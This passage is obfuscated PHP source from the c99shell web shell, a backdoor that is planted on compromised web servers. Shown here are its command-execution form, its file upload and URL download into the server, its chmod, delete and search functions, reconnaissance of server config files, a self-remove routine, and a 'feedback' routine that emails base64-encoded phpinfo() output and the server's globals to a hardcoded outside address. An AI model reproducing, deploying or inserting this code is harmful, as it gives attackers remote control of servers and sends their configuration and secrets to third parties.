myshellexec('whereis apache')); displaysecinfo('Where is perl?', myshellexec('whereis perl')); displaysecinfo('locate proftpd.conf', myshellexec('locate proftpd.conf')); displaysecinfo('locate httpd.conf', myshellexec('locate httpd.conf')); displaysecinfo('locate my.conf', myshellexec('locate my.conf')); displaysecinfo('locate psybnc.conf', myshellexec('locate psybnc.conf')); } if ($spe3b8cc == 'mkfile') { if ($sp9d6b0d != $sp6bf0a4) { if (file_exists($sp9d6b0d)) { echo '<b>Make File "' . htmlspecialchars($sp9d6b0d) . '"</b>: object alredy exists'; } elseif (!fopen($sp9d6b0d, 'w')) { echo '<b>Make File "' . htmlspecialchars($sp9d6b0d) . '"</b>: access denied'; } else { $spe3b8cc = 'f'; $sp6bf0a4 = dirname($sp9d6b0d); if (substr($sp6bf0a4, -1) != DIRECTORY_SEPARATOR) { $sp6bf0a4 .= DIRECTORY_SEPARATOR; } $sp224638 = basename($sp9d6b0d); } } else { $spe3b8cc = $sp68666d = 'ls'; } } if ($spe3b8cc == 'encoder') { echo '<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name="encoder" action="' . $sp8c8b96 . '" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name="encoder_input" id="input" cols=50 rows=5>' . @htmlspecialchars($sp27d5cd) . '</textarea><br><br><input type=submit value="calculate"><br><br></center><b>Hashes</b>:<br><center>'; foreach (array('md5', 'crypt', 'sha1', 'crc32') as $spe2ff4f) { echo $spe2ff4f . ' - <input type=text size=50 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . $spe2ff4f($sp27d5cd) . '" readonly><br>'; } echo '</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . urlencode($sp27d5cd) . '" readonly>
 <br>urldecode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . htmlspecialchars(urldecode($sp27d5cd)) . '" readonly>
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . base64_encode($sp27d5cd) . '" readonly></center>'; echo '<center>base64_decode - '; if (base64_encode(base64_decode($sp27d5cd)) != $sp27d5cd) { echo '<input type=text size=35 value="failed" disabled readonly>'; } else { $spb0c941 = base64_decode($sp27d5cd); $spb0c941 = str_replace(' ', '[0]', $spb0c941); $sp5955cc = explode('
', $spb0c941); $spb7d784 = count($sp5955cc); $spb0c941 = htmlspecialchars($spb0c941); if ($spb7d784 == 1) { echo '<input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . $spb0c941 . '" id="debase64" readonly>'; } else { $spb7d784++; echo '<textarea cols="40" rows="' . $spb7d784 . '" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" id="debase64" readonly>' . $spb0c941 . '</textarea>'; } echo '&nbsp;<a href="#" onclick="set_encoder_input(document.forms.encoder.debase64.value)"><b>^</b></a>'; } echo '</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="'; $sp76d016 = strlen($sp27d5cd); for ($sp6c3e91 = 0; $sp6c3e91 < $sp76d016; $sp6c3e91++) { $sp55bd85 = dechex(ord($sp27d5cd[$sp6c3e91])); if ($sp27d5cd[$sp6c3e91] == '&') { echo $sp27d5cd[$sp6c3e91]; } elseif ($sp27d5cd[$sp6c3e91] != '\\') { echo '%' . $sp55bd85; } } echo '" readonly><br></center></form>'; } if ($spe3b8cc == 'fsbuff') { $sp7d06d0 = $spc8cb58['copy']; $spf45309 = $spc8cb58['cut']; $sp662a5a = array_merge($sp7d06d0, $spf45309); if (count($sp662a5a) == 0) { echo '<center><b>Buffer is empty!</b></center>'; } else { echo '<b>File-System buffer</b><br><br>'; $sp6a4aa1 = $sp662a5a; $sp71526b = true; $spe3b8cc = 'ls'; } } if ($spe3b8cc == 'selfremove') { if ($spff71ed == $sp6ec2cc and $spff71ed != '') { if (unlink(__FILE__)) { @ob_clean(); echo 'Thanks for using c99shell v.' . $sp272375 . '!'; c99shexit(); } else { echo '<center><b>Can\'t delete ' . __FILE__ . '!</b></center>'; } } else { if (!empty($sp6ec2cc)) { echo '<b>Error: incorrect confimation!</b>'; } $spbeee85 = rand(0, 9) . rand(0, 9) . rand(0, 9); echo '<form action="' . $sp8c8b96 . '"><input type=hidden name=act value=selfremove><b>Self-remove: ' . __FILE__ . ' <br><b>Are you sure?<br>For confirmation, enter "' . $spbeee85 . '"</b>:&nbsp;<input type=hidden name=rndcode value="' . $spbeee85 . '"><input type=text name=submit>&nbsp;<input type=submit value="YES"></form>'; } } if ($spe3b8cc == 'update') { $spe6a02a = c99sh_getupdate(!!$sp0da353); echo '<b>' . $spe6a02a . '</b>'; if (stristr($spe6a02a, 'new version')) { echo '<br><br><input type=button onclick="location.href=\'' . $sp8c8b96 . 'act=update&confirmupdate=1\';" value="Update now">'; } } if ($spe3b8cc == 'feedback') { $spc079d5 = base64_decode('Yzk5c2hlbGxAY2N0ZWFtLnJ1'); if (!empty($spff71ed)) { $sp263d5f = substr(md5(microtime() + rand(1, 1000)), 0, 6); $sp15a5cb = 'c99shell v.' . $sp272375 . ' feedback #' . $sp263d5f . '
Name: ' . htmlspecialchars($sp9ea214) . '
E-mail: ' . htmlspecialchars($sp50db72) . '
Message:
' . htmlspecialchars($sp52ebaf) . '

IP: ' . $sp47d566; if (!empty($spb45d93)) { $sped1c3a = @ob_get_contents(); ob_clean(); phpinfo(); $sp00fce8 = base64_encode(ob_get_contents()); ob_clean(); echo $sped1c3a; $sp15a5cb .= '
' . 'phpinfo(): ' . $sp00fce8 . '
' . '$GLOBALS=' . base64_encode(serialize($sp64e32a)) . '
'; } mail($spc079d5, 'c99shell v.' . $sp272375 . ' feedback #' . $sp263d5f, $sp15a5cb, 'FROM: ' . $spc079d5); echo '<center><b>Thanks for your feedback! Your ticket ID: ' . $sp263d5f . '.</b></center>'; } else { echo '<form action="' . $sp8c8b96 . '" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (' . str_replace(array('@', '.'), array('[at]', '[dot]'), $spc079d5) . '):<br><br>Your name: <input type="text" name="fdbk_name" value="' . htmlspecialchars($sp9ea214) . '"><br><br>Your e-mail: <input type="text" name="fdbk_email" value="' . htmlspecialchars($sp50db72) . '"><br><br>Message:<br><textarea name="fdbk_body" cols=80 rows=10>' . htmlspecialchars($sp52ebaf) . '</textarea><input type="hidden" name="fdbk_ref" value="' . urlencode($spfb812b) . '"><br><br>Attach server-info * <input type="checkbox" name="fdbk_servinf" value="1" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type="submit" name="submit" value="Send"></form>'; } } if ($spe3b8cc == 'search') { echo '<b>Search in file-system:</b><br>'; if (empty($spc2e1e2)) { $spc2e1e2 = $sp6bf0a4; } if (empty($spc8231f)) { $spc8231f = '(.*)'; $sp489e6e = 1; } if (empty($sp696626)) { $sp012b1c = 0; } if (!empty($spff71ed)) { $sp16bd78 = array(); $spa5c046 = 0; $sp9696a6 = 0; $spe0d033 = 0; $sp420ea0 = 0; $sp5955cc = array('name' => $spc8231f, 'name_regexp' => $sp489e6e, 'text' => $spb2afd0, 'text_regexp' => $spcddbd9, 'text_wwo' => $sp696626, 'text_cs' => $sp18f157, 'text_not' => $spd0ed46); $spd380f3 = getmicrotime(); $spfd8b49 = array_unique(explode(';', $spc2e1e2)); foreach ($spfd8b49 as $spe2ff4f) { c99fsearch($spe2ff4f); } $spd380f3 = round(getmicrotime() - $spd380f3, 4); if (count($sp16bd78) == 0) { echo '<b>No files found!</b>'; } else { $sp6a4aa1 = $sp16bd78; $sp71526b = true; $spe3b8cc = 'ls'; } } echo '<form method=POST>
<input type=hidden name="d" value="' . $sp67e5dd . '"><input type=hidden name=act value="' . $sp68666d . '">
<b>Search for (file/folder name): </b><input type="text" name="search_name" size="' . round(strlen($spc8231f) + 25) . '" value="' . htmlspecialchars($spc8231f) . '">&nbsp;<input type="checkbox" name="search_name_regexp" value="1" ' . ($sp489e6e == 1 ? ' checked' : '') . '> - regexp
<br><b>Search in (explode ";"): </b><input type="text" name="search_in" size="' . round(strlen($spc2e1e2) + 25) . '" value="' . htmlspecialchars($spc2e1e2) . '">
<br><br><b>Text:</b><br><textarea name="search_text" cols="122" rows="10">' . htmlspecialchars($spb2afd0) . '</textarea>
<br><br><input type="checkbox" name="search_text_regexp" value="1" ' . ($sp012b1c == 1 ? ' checked' : '') . '> - regexp
&nbsp;&nbsp;<input type="checkbox" name="search_text_wwo" value="1" ' . ($sp696626 == 1 ? ' checked' : '') . '> - <u>w</u>hole words only
&nbsp;&nbsp;<input type="checkbox" name="search_text_cs" value="1" ' . ($sp18f157 == 1 ? ' checked' : '') . '> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type="checkbox" name="search_text_not" value="1" ' . ($spd0ed46 == 1 ? ' checked' : '') . '> - find files <u>NOT</u> containing the text
<br><br><input type=submit name=submit value="Search"></form>'; if ($spe3b8cc == 'ls') { $sp68666d = $spe3b8cc; echo '<hr size="1" noshade><b>Search took ' . $spd380f3 . ' secs (' . $spe0d033 . ' files and ' . $sp420ea0 . ' folders, ' . round(($spe0d033 + $sp420ea0) / $spd380f3, 4) . ' objects per second).</b><br><br>'; } } if ($spe3b8cc == 'chmod') { $sp9dace2 = fileperms($sp6bf0a4 . $sp224638); if (!$sp9dace2) { echo '<b>Change file-mode with error:</b> can\'t get current value.'; } else { $sp6f9eea = true; if ($sp287b2f) { $spa07ec1 = '0' . base_convert(($sp137a5c['r'] ? 1 : 0) . ($sp137a5c['w'] ? 1 : 0) . ($sp137a5c['x'] ? 1 : 0) . ($spbb5df6['r'] ? 1 : 0) . ($spbb5df6['w'] ? 1 : 0) . ($spbb5df6['x'] ? 1 : 0) . ($spa50f42['r'] ? 1 : 0) . ($spa50f42['w'] ? 1 : 0) . ($spa50f42['x'] ? 1 : 0), 2, 8); if (chmod($sp6bf0a4 . $sp224638, $spa07ec1)) { $spe3b8cc = 'ls'; $sp6f9eea = false; $sp90814c = ''; } else { $sp90814c = 'Can\'t chmod to ' . $spa07ec1 . '.'; } } if ($sp6f9eea) { $spca9917 = parse_perms($sp9dace2); echo '<b>Changing file-mode (' . $sp6bf0a4 . $sp224638 . '), ' . view_perms_color($sp6bf0a4 . $sp224638) . ' (' . substr(decoct(fileperms($sp6bf0a4 . $sp224638)), -4, 4) . ')</b><br>' . ($sp90814c ? '<b>Error:</b> ' . $sp90814c : '') . '<form action="' . $sp8c8b96 . '" method=POST><input type=hidden name=d value="' . htmlspecialchars($sp6bf0a4) . '"><input type=hidden name=f value="' . htmlspecialchars($sp224638) . '"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1' . ($spca9917['o']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1' . ($spca9917['o']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1' . ($spca9917['o']['x'] ? ' checked' : '') . '>eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1' . ($spca9917['g']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1' . ($spca9917['g']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1' . ($spca9917['g']['x'] ? ' checked' : '') . '>eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1' . ($spca9917['w']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1' . ($spca9917['w']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1' . ($spca9917['w']['x'] ? ' checked' : '') . '>eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value="Save"></td></tr></table></form>'; } } } if ($spe3b8cc == 'upload') { $spd8a6de = ''; $sp764afc = str_replace('\\', DIRECTORY_SEPARATOR, $sp764afc); if (empty($sp764afc)) { $sp764afc = $sp6bf0a4; } elseif (substr($sp764afc, -1) != '/') { $sp764afc .= '/'; } if (!empty($spff71ed)) { global $sp275713; $sp06c4c1 = $sp275713['uploadfile']; if (!empty($sp06c4c1['tmp_name'])) { if (empty($spdac96b)) { $spd320dc = $sp06c4c1['name']; } else { $spd320dc = $spbfa97f; } if (!move_uploaded_file($sp06c4c1['tmp_name'], $sp764afc . $spd320dc)) { $spd8a6de .= 'Error uploading file ' . $sp06c4c1['name'] . ' (can\'t copy "' . $sp06c4c1['tmp_name'] . '" to "' . $sp764afc . $spd320dc . '"!<br>'; } } elseif (!empty($spfb782e)) { if (!empty($spdac96b)) { $spd320dc = $spdac96b; } else { $spd320dc = explode('/', $spd320dc); $spd320dc = $spd320dc[count($spd320dc) - 1]; if (empty($spd320dc)) { $sp6c3e91 = 0; $sp873f91 = ''; while (file_exists($sp764afc . $spd320dc)) { if ($sp6c3e91 > 0) { $sp873f91 = '_' . $sp6c3e91; } $spd320dc = 'index' . $sp873f91 . '.html'; $sp6c3e91++; } } } if (!preg_match('http://', $spfb782e) and !preg_match('https://', $spfb782e) and !preg_match('ftp://', $spfb782e)) { echo '<b>Incorect url!</b><br>'; } else { $sp49d303 = getmicrotime(); $sp1c78b4 = @file_get_contents($spfb782e); $spc82c0b = round(getmicrotime() - $sp49d303, 4); if (!$sp1c78b4) { $spd8a6de .= 'Can\'t download file!<br>'; } else { if ($spfc68ef) { $spb5bb2c = stat($sp764afc . $spd320dc); } $sp694629 = fopen($sp764afc . $spd320dc, 'w'); if (!$sp694629) { $spd8a6de .= 'Error writing to file ' . htmlspecialchars($spd320dc) . '!<br>'; } else { fwrite($sp694629, $sp1c78b4, strlen($sp1c78b4)); fclose($sp694629); if ($spfc68ef) { touch($sp764afc . $spd320dc, $spb5bb2c[9], $spb5bb2c[8]); } } } } } } if ($spb4ee07) { echo '<b>' . $spd8a6de . '</b>'; $spe3b8cc = 'ls'; } else { echo '<b>File upload:</b><br><b>' . $spd8a6de . '</b><form enctype="multipart/form-data" action="' . $sp8c8b96 . 'act=upload&d=' . urlencode($sp6bf0a4) . '" method=POST>
Select file on your local computer: <input name="uploadfile" type="file"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Input URL: <input name="uploadurl" type="text" value="' . htmlspecialchars($spfb782e) . '" size="70"><br><br>
Save this file dir: <input name="uploadpath" size="70" value="' . $sp67e5dd . '"><br><br>
File-name (auto-fill): <input name=uploadfilename size=25><br><br>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
<input type=submit name=submit value="Upload">
</form>'; } } if ($spe3b8cc == 'delete') { $spa46274 = ''; foreach ($sp2e8d1b as $spe2ff4f) { $spea30d5 = false; $spea30d5 = fs_rmobj($spe2ff4f); if (!$spea30d5) { $spa46274 .= 'Can\'t delete ' . htmlspecialchars($spe2ff4f) . '<br>'; } } if (!empty($spa46274)) { echo '<b>Deleting with errors:</b><br>' . $spa46274; } $spe3b8cc = 'ls'; } if (!$spe9e736) { if ($spe3b8cc == 'paste' or $spe3b8cc == 'copy' or $spe3b8cc == 'cut' or $spe3b8cc == 'unselect') { echo '<center><b>Sorry, buffer is disabled. For enable, set directive "$useFSbuff" as TRUE.</center>'; } } else { if ($spe3b8cc == 'copy') { $sp90814c = ''; $spc8cb58['copy'] = array_merge($spc8cb58['copy'], $sp2e8d1b); c99_sess_put($spc8cb58); $spe3b8cc = 'ls'; } elseif ($spe3b8cc == 'cut') { $spc8cb58['cut'] = array_merge($spc8cb58['cut'], $sp2e8d1b); c99_sess_put($spc8cb58); $spe3b8cc = 'ls'; } elseif ($spe3b8cc == 'unselect') { foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { if (in_array($spe2ff4f, $sp2e8d1b)) { unset($spc8cb58['copy'][$sp71a197]); } } foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { if (in_array($spe2ff4f, $sp2e8d1b)) { unset($spc8cb58['cut'][$sp71a197]); } } c99_sess_put($spc8cb58); $spe3b8cc = 'ls'; } if ($sp41b90e) { $spc8cb58['copy'] = $spc8cb58['cut'] = array(); c99_sess_put($spc8cb58); } elseif ($spb6d641) { $sp07b241 = ''; foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { $sp438846 = $sp6bf0a4 . basename($spe2ff4f); if (!fs_copy_obj($spe2ff4f, $sp438846)) { $sp07b241 .= 'Can\'t copy ' . $spe2ff4f . ' to ' . $sp438846 . '!<br>'; } if ($sp707446) { unset($spc8cb58['copy'][$sp71a197]); } } foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { $sp438846 = $sp6bf0a4 . basename($spe2ff4f); if (!fs_move_obj($spe2ff4f, $sp438846)) { $sp07b241 .= 'Can\'t move ' . $spe2ff4f . ' to ' . $sp438846 . '!<br>'; } unset($spc8cb58['cut'][$sp71a197]); } c99_sess_put($spc8cb58); if (!empty($sp07b241)) { echo '<b>Pasting with errors:</b><br>' . $sp07b241; } $spe3b8cc = 'ls'; } elseif ($sp1aa5ed) { $spb11817 = ''; if (substr($sp208dbf, -7, 7) == '.tar.gz') { $spe7e244 = '.tar.gz'; } else { $spe7e244 = '.tar.gz'; } if ($spe7e244 == '.tar.gz') { $sp744fc8 = 'tar cfzv'; } $sp744fc8 .= ' ' . $sp208dbf; $sp3dd715 = array_merge($spc8cb58['copy'], $spc8cb58['cut']); foreach ($sp3dd715 as $spe2ff4f) { $spe2ff4f = str_replace('\\', DIRECTORY_SEPARATOR, $spe2ff4f); if (substr($spe2ff4f, 0, strlen($sp6bf0a4)) == $sp6bf0a4) { $spe2ff4f = basename($spe2ff4f); } if (is_dir($spe2ff4f)) { if (substr($spe2ff4f, -1) != DIRECTORY_SEPARATOR) { $spe2ff4f .= DIRECTORY_SEPARATOR; } $spe2ff4f .= '*'; } $sp744fc8 .= ' ' . $spe2ff4f; } $sped1c3a = realpath('.'); chdir($sp6bf0a4); $spe6a02a = myshellexec($sp744fc8); chdir($sped1c3a); if (empty($spe6a02a)) { $spb11817 .= 'Can\'t call archivator (' . htmlspecialchars(str2mini($sp744fc8, 60)) . ')!<br>'; } $spe6a02a = str_replace('
', '
', $spe6a02a); $spe6a02a = explode('
', $spe6a02a); if ($sp707446) { foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { unset($spc8cb58['copy'][$sp71a197]); } } foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { if (in_array($spe2ff4f, $spe6a02a)) { fs_rmobj($spe2ff4f); } unset($spc8cb58['cut'][$sp71a197]); } c99_sess_put($spc8cb58); if (!empty($spb11817)) { echo '<b>Archivation errors:</b><br>' . $spb11817; } $spe3b8cc = 'ls'; } elseif ($spb6d641) { $sp07b241 = ''; foreach ($spc8cb58['copy'] as $sp71a197 => $spe2ff4f) { $sp438846 = $sp6bf0a4 . basename($spe2ff4f); if (!fs_copy_obj($spe2ff4f, $sp6bf0a4)) { $sp07b241 .= 'Can\'t copy ' . $spe2ff4f . ' to ' . $sp438846 . '!<br>'; } if ($sp707446) { unset($spc8cb58['copy'][$sp71a197]); } } foreach ($spc8cb58['cut'] as $sp71a197 => $spe2ff4f) { $sp438846 = $sp6bf0a4 . basename($spe2ff4f); if (!fs_move_obj($spe2ff4f, $sp6bf0a4)) { $sp07b241 .= 'Can\'t move ' . $spe2ff4f . ' to ' . $sp438846 . '!<br>'; } unset($spc8cb58['cut'][$sp71a197]); } c99_sess_put($spc8cb58); if (!empty($sp07b241)) { echo '<b>Pasting with errors:</b><br>' . $sp07b241; } $spe3b8cc = 'ls'; } } if ($spe3b8cc == 'cmd') { if (trim($sp7bd36a) == 'ps -aux') { $spe3b8cc = 'processes'; } elseif (trim($sp7bd36a) == 'tasklist') { $spe3b8cc = 'processes'; } else { @chdir($spde510b); if (!empty($spff71ed)) { echo '<b>Result of execution this command</b>:<br>'; $sp0ec61f = realpath('.'); @chdir($sp6bf0a4); $spe6a02a = myshellexec($sp7bd36a); $spe6a02a = convert_cyr_string($spe6a02a, 'd', 'w'); if ($sp4a9d80) { $spb7d784 = count(explode('
', $spe6a02a)) + 1; if ($spb7d784 < 10) { $spb7d784 = 10; } echo '<br><textarea cols="122" rows="' . $spb7d784 . '" readonly>' . htmlspecialchars($spe6a02a) . '</textarea>'; } else { echo $spe6a02a . '<br>'; } @chdir($sp0ec61f); } else { echo '<b>Execution command</b>'; if (empty($sp4a9d80)) { $sp4a9d80 = true; } } echo '<form action="' . $sp8c8b96 . '" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>' . htmlspecialchars($sp7bd36a) . '</textarea><input type=hidden name="d" value="' . $sp67e5dd . '"><br><br><input type=submit name=submit value="Execute">&nbsp;Display in text-area&nbsp;<input type="checkbox" name="cmd_txt" value="1"'; if ($sp4a9d80) { echo ' checked'; } echo '></form>'; } } if ($spe3b8cc == 'ls') { if (count($sp6a4aa1) > 0) { $sp6a3fdf = $sp6a4aa1; } else { $sp6a3fdf = array(); if ($sp4431a3 = @opendir($sp6bf0a4)) { while (($spf60383 = readdir($sp4431a3)) !== false) { $sp6a3fdf[] = $sp6bf0a4 . $spf60383; } closedir($sp4431a3); } else { } } if (count($sp6a3fdf) == 0) { echo '<center><b>Can\'t open folder (' . htmlspecialchars($sp6bf0a4) . ')!</b></center>'; } else { $sp3dd715 = array(); $spd95d81 = 'f'; if ($spd95d81 == 'f') { $sp3dd715['head'] = array(); $sp3dd715['folders'] = array(); $sp3dd715['links'] = array(); $sp3dd715['files'] = array(); foreach ($sp6a3fdf as $spe2ff4f) { $spf60383 = basename($spe2ff4f); $spa53ce4 = array(); if ($spf60383 == '.') { $spa53ce4[] = $sp6bf0a4 . $spf60383; $spa53ce4[] = 'LINK'; } elseif ($spf60383 == '..') { $spa53ce4[] = $sp6bf0a4 . $spf60383; $spa53ce4[] = 'LINK'; } elseif (is_dir($spe2ff4f)) { if (is_link($spe2ff4f)) { $spb06e63 = 'LINK'; } else { $spb06e63 = 'DIR'; } $spa53ce4[] = $spe2ff4f; $spa53ce4[] = $spb06e63; } elseif (is_file($spe2ff4f)) { $spa53ce4[] = $spe2ff4f; $spa53ce4[] = filesize($spe2ff4f); } $spa53ce4[] = filemtime($spe2ff4f); if (!$sp01e9c0) { $spc936c1 = posix_getpwuid(fileowner($spe2ff4f)); $spdd067c = posix_getgrgid(filegroup($spe2ff4f)); $spa53ce4[] = ($spc936c1['name'] ? $spc936c1['name'] : fileowner($spe2ff4f)) . '/' . ($spdd067c['name'] ? $spdd067c['name'] : filegroup($spe2ff4f)); } $spa53ce4[] = fileperms($spe2ff4f); if ($spf60383 == '.' or $spf60383 == '..') { $sp3dd715['head'][] = $spa53ce4; } elseif (is_link($spe2ff4f)) { $sp3dd715['links'][] = $spa53ce4; } elseif (is_dir($spe2ff4f)) { $sp3dd715['folders'][] = $spa53ce4; } elseif (is_file($spe2ff4f)) { $sp3dd715['files'][] = $spa53ce4; } $sp6c3e91++; } $spa53ce4 = array(); $spa53ce4[] = '<b>Name</b>'; $spa53ce4[] = '<b>Size</b>'; $spa53ce4[] = '<b>Modify</b>'; if (!$sp01e9c0) { $spa53ce4[] = '<b>Owner/Group</b>'; } $spa53ce4[] = '<b>Perms</b>'; $spa53ce4[] = '<b>Action</b>'; $spc4a1aa = parsesort($sp946414); $sp946414 = $spc4a1aa[0] . $spc4a1aa[1]; $sp71a197 = $spc4a1aa[0]; if ($spc4a1aa[1] != 'a') { $spc4a1aa[1] = 'd'; } $sp08c43f = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&sort=' . $sp71a197 . ($spc4a1aa[1] == 'a' ? 'd' : 'a') . '">'; $sp08c43f .= '<img src="' . $sp8c8b96 . 'act=img&img=sort_' . ($sp946414[1] == 'a' ? 'asc' : 'desc') . '" height="9" width="14" alt="' . ($spc4a1aa[1] == 'a' ? 'Asc.' : 'Desc') . '" border="0"></a>'; $spa53ce4[$sp71a197] .= $sp08c43f; for ($sp6c3e91 = 0; $sp6c3e91 < count($spa53ce4) - 1; $sp6c3e91++) { if ($sp6c3e91 != $sp71a197) { $spa53ce4[$sp6c3e91] = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&sort=' . $sp6c3e91 . $spc4a1aa[1] . '">' . $spa53ce4[$sp6c3e91] . '</a>'; } } $spe2ff4f = $spc4a1aa[0]; usort($sp3dd715['folders'], 'tabsort'); usort($sp3dd715['links'], 'tabsort'); usort($sp3dd715['files'], 'tabsort'); if ($spc4a1aa[1] == 'd') { $sp3dd715['folders'] = array_reverse($sp3dd715['folders']); $sp3dd715['files'] = array_reverse($sp3dd715['files']); } $sp3dd715 = array_merge($sp3dd715['head'], $sp3dd715['folders'], $sp3dd715['links'], $sp3dd715['files']); $sp0b0ef0 = array(); $sp0b0ef0['cols'] = array($spa53ce4); $sp0b0ef0['head'] = array(); $sp0b0ef0['folders'] = array(); $sp0b0ef0['links'] = array(); $sp0b0ef0['files'] = array(); $sp6c3e91 = 0; foreach ($sp3dd715 as $sp5955cc) { $spe2ff4f = $sp5955cc[0]; $spf60383 = basename($spe2ff4f); $spa25e24 = dirname($spe2ff4f); if ($sp71526b) { $spa150f2 = $spe2ff4f; } else { $spa150f2 = $spf60383; } $spa150f2 = str2mini($spa150f2, 60); if (in_array($spe2ff4f, $spc8cb58['cut'])) { $spa150f2 = '<strike>' . $spa150f2 . '</strike>'; } elseif (in_array($spe2ff4f, $spc8cb58['copy'])) { $spa150f2 = '<u>' . $spa150f2 . '</u>'; } foreach ($spdcaf8d as $spd6dd63) { if (preg_match($spd6dd63[0], $spf60383)) { if (!is_numeric($spd6dd63[1]) or $spd6dd63[1] > 3) { $spd6dd63[1] = 0; ob_clean(); echo 'Warning! Configuration error in $regxp_highlight[' . $sp71a197 . '][0] - unknown command.'; c99shexit(); } else { $spd6dd63[1] = round($spd6dd63[1]); $sp3ad95c = is_dir($spe2ff4f); if ($spd6dd63[1] == 0 or $spd6dd63[1] == 1 and !$sp3ad95c or $spd6dd63[1] == 2 and !$sp3ad95c) { if (empty($spd6dd63[2])) { $spd6dd63[2] = '<b>'; $spd6dd63[3] = '</b>'; } $spa150f2 = $spd6dd63[2] . $spa150f2 . $spd6dd63[3]; if ($spd6dd63[4]) { break; } } } } } $sp3fed51 = urlencode($spf60383); $spb26308 = urlencode($spa25e24); $sp2835d8 = urlencode($spe2ff4f); $spa53ce4 = array(); if ($spf60383 == '.') { $spa53ce4[] = '<img src="' . $sp8c8b96 . 'act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode(realpath($sp6bf0a4 . $spf60383)) . '&sort=' . $sp946414 . '">' . $spf60383 . '</a>'; $spa53ce4[] = 'LINK'; } elseif ($spf60383 == '..') { $spa53ce4[] = '<img src="' . $sp8c8b96 . 'act=img&img=ext_lnk" height="16" width="19" border="0">&nbsp;<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode(realpath($sp6bf0a4 . $spf60383)) . '&sort=' . $sp946414 . '">' . $spf60383 . '</a>'; $spa53ce4[] = 'LINK'; } elseif (is_dir($spe2ff4f)) { if (is_link($spe2ff4f)) { $spa150f2 .= ' => ' . readlink($spe2ff4f); $spb06e63 = 'LINK'; $spa53ce4[] = '<img src="' . $sp8c8b96 . 'act=img&img=ext_lnk" height="16" width="16" border="0">&nbsp;<a href="' . $sp8c8b96 . 'act=ls&d=' . $sp2835d8 . '&sort=' . $sp946414 . '">[' . $spa150f2 . ']</a>'; } else { $spb06e63 = 'DIR'; $spa53ce4[] = '<img src="' . $sp8c8b96 . 'act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="' . $sp8c8b96 . 'act=ls&d=' . $sp2835d8 . '&sort=' . $sp946414 . '">[' . $spa150f2 . ']</a>'; } $spa53ce4[] = $spb06e63; } elseif (is_file($spe2ff4f)) { $spe7e244 = explode('.', $spf60383); $sp76d016 = count($spe7e244) - 1; $spe7e244 = $spe7e244[$sp76d016]; $spe7e244 = strtolower($spe7e244); $spa53ce4[] = '<img src="' . $sp8c8b96 . 'act=img&img=ext_' . $spe7e244 . '" border="0">&nbsp;<a href="' . $sp8c8b96 . 'act=f&f=' . $sp3fed51 . '&d=' . $spb26308 . '&">' . $spa150f2 . '</a>'; $spa53ce4[] = view_size($sp5955cc[1]); } $spa53ce4[] = date('d.m.Y H:i:s', $sp5955cc[2]); if (!$sp01e9c0) { $spa53ce4[] = $sp5955cc[3]; } $spa53ce4[] = '<a href="' . $sp8c8b96 . 'act=chmod&f=' . $sp3fed51 . '&d=' . $spb26308 . '"><b>' . view_perms_color($spe2ff4f) . '</b></a>'; if ($spf60383 == '.') { $sp85cee6 = '<input type="checkbox" name="actbox[]" onclick="ls_reverse_all();">'; $sp6c3e91--; } else { $sp85cee6 = '<input type="checkbox" name="actbox[]" id="actbox' . $sp6c3e91 . '" value="' . htmlspecialchars($spe2ff4f) . '">'; } if (is_dir($spe2ff4f)) { $spa53ce4[] = '<a href="' . $sp8c8b96 . 'act=d&d=' . $sp2835d8 . '"><img src="' . $sp8c8b96 . 